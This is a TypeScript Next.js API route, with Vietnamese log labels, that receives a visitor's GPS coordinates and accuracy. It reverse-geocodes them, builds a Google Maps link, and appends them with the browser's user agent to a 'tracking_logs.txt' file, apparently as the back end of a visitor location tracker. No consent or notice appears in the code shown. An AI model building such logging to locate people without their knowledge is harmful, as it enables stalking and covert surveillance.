
import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { headers } from 'next/headers';

async function getAddress(lat: number, lon: number): Promise<string> {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`, {
          headers: {
            'User-Agent': 'FirebaseStudio/1.0'
          }
        });
        if (!response.ok) return "Không thể lấy địa chỉ.";

        const data = await response.json();
        return data.display_name || "Không tìm thấy tên địa chỉ.";
    } catch (error) {
        return "Lỗi khi truy vấn địa chỉ.";
    }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { lat, lon, acc } = body;

    if (lat === undefined || lon === undefined) {
      return NextResponse.json({ error: 'Missing location data' }, { status: 400 });
    }

    const headersList = headers();
    const ua = headersList.get('user-agent') ?? 'unknown';

    const address = await getAddress(lat, lon);
    const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
    
    let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
    logData += `Thiết bị: ${ua}\n`;
    logData += `Tọa độ: ${lat}, ${lon}\n`;
    logData += `Độ chính xác: ${acc || 'N/A'}m\n`;
    logData += `Địa chỉ: ${address}\n`;
    logData += `Link Google Maps: ${maps_link}\n`;
    logData += `----------------------------------\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }

    fs.appendFileSync(logFile, logData, 'utf-8');
    
    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('Failed to log location:', error);
    const errorMessage = error instanceof Error ? error.message : 'An unknown error occurred';
    return NextResponse.json({ error: 'Failed to process request', details: errorMessage }, { status: 500 });
  }
}
